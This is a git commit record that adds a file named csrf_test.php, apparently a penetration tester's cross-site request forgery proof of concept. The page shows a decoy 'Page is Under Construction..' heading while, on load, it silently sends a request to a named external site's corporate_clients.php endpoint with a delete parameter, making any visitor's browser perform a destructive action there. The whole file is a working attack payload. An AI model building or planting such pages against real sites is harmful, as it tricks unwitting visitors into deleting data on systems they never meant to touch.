4bcba08e304803bce661652b5bff63ece4082749
unknown <ut001@UT00182.us.nam.ad.pwcinternal.com>
2016-10-29 16:03:09 +0530

    CSRF Test

---
+++ csrf_test.php
@@ -0,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+<head>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
+<script>
+$(document).ready(function(){
+    $.ajax({url: "http://viewmea.com/fr/corporate_clients.php?delparam=130", success: function(result){
+    }});
+});
+</script>
+</head>
+<body>
+    <h1>Page is Under Construction..</h1>
+</body>
+</html>
